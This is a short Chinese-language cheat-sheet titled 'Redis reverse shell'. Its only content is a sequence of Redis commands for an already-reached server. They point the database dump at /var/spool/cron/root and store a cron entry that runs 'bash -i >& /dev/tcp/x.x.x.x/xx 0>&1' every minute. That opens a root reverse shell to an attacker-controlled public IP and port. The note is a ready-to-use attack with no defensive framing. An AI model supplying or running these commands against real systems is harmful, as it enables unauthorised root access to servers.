# Redis 反弹5he11

---

连接后：

```
设置任务（x.x.x.x：公网IP  xx ：公网IP的端口号）
config set dir /var/spool/cron/
config set dbfilename root
set x "\n\n\n*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/xx 0>&1\n\n\n"
save
```